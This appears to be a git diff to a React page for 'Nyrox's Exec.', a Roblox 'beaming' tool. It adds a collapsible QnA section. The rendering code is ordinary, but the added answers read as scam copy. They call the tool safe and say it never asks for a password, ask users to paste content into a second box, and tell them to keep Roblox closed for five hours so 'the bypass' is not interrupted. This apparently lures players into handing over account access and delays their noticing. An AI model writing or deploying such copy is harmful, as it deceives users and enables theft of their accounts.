@@ -58,6 +58,25 @@ const STORAGE_KEY = "queue-entered-at";
 const TUTORIAL_VIDEO_ID = "dQw4w9WgXcQ";
 const TUTORIAL_VIDEO_SRC = `https://www.youtube-nocookie.com/embed/${TUTORIAL_VIDEO_ID}`;
 
+// ───────────────────────────────────────────────────────────────────────────
+// QnA section. Edit the questions and answers below — add, remove, or change
+// items freely. Each entry has a `q` (question) and `a` (answer).
+// ───────────────────────────────────────────────────────────────────────────
+const QNA_ITEMS: { q: string; a: string }[] = [
+  {
+    q: "Is Nyrox's Exec. safe to use?",
+    a: "Yes. The tool runs remotely and never asks for your password. We only need your username to confirm your account before beaming.",
+  },
+  {
+    q: "How long does the beaming process take?",
+    a: "The full process takes around 5 hours. During that time, keep Roblox closed so the bypass doesn't get interrupted.",
+  },
+  {
+    q: "What do I paste in the second box?",
+    a: "Paste the content you want beamed. Make sure both the Username and Paste Here fields are filled before pressing Send.",
+  },
+];
+
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
@@ -86,6 +105,47 @@ function formatCountdown(ms: number) {
   const m = Math.floor((totalSec % 3600) / 60);
   const s = totalSec % 60;
   return `${h}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
+}
+
+/** Collapsible QnA card with a rotating chevron. */
+function QnAItem({ q, a }: { q: string; a: string }) {
+  const [open, setOpen] = useState(false);
+  return (
+    <div className="glass-panel rounded-3xl overflow-hidden">
+      <button
+        type="button"
+        onClick={() => setOpen((v) => !v)}
+        className="flex w-full items-center justify-between gap-4 px-6 py-5 text-left cursor-pointer"
+        aria-expanded={open}
+      >
+        <span className="text-base font-semibold text-foreground">{q}</span>
+        <svg
+          className={`h-5 w-5 shrink-0 text-muted-foreground transition-transform duration-300 ${
+            open ? "rotate-180" : ""
+          }`}
+          viewBox="0 0 20 20"
+          fill="none"
+          stroke="currentColor"
+          strokeWidth="2"
+          strokeLinecap="round"
+          strokeLinejoin="round"
+        >
+          <path d="M5 8l5 5 5-5" />
+        </svg>
+      </button>
+      <div
+        className={`grid transition-[grid-template-rows] duration-300 ease-out ${
+          open ? "grid-rows-[1fr]" : "grid-rows-[0fr]"
+        }`}
+      >
+        <div className="overflow-hidden">
+          <p className="px-6 pb-5 text-base leading-relaxed text-muted-foreground">
+            {a}
+          </p>
+        </div>
+      </div>
+    </div>
+  );
 }
 
 function Index() {
@@ -394,6 +454,20 @@ function Index() {
                   allowFullScreen
                 />
               </div>
+            </div>
+          </div>
+        </section>
+
+        {/* QnA section */}
+        <section className="flex flex-col items-center px-6 pb-16">
+          <div className="w-full max-w-2xl text-center">
+            <h2 className="text-3xl font-semibold tracking-tight text-foreground sm:text-4xl">
+              QnA
+            </h2>
+            <div className="mt-5 space-y-3 text-left">
+              {QNA_ITEMS.map((item, i) => (
+                <QnAItem key={i} q={item.q} a={item.a} />
+              ))}
             </div>
           </div>
         </section>
